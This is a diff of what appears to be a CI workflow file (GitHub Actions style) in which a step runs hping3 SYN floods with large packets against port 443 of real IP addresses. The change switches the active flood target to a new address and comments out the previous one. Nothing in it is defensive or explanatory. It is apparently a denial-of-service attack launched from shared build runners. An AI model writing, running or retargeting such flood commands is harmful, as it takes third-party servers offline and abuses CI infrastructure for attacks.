@@ -73,7 +73,8 @@ jobs:
 
           # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 182.16.89.10 || true
           # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 182.16.89.11 || true
-          sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 154.198.240.70 || true
+          sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 180.178.38.85 || true
+          # sudo timeout 5s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 154.198.240.70 || true
 
       - name: 再次检查首个job完成时间（第二次 restore）
         id: double_check
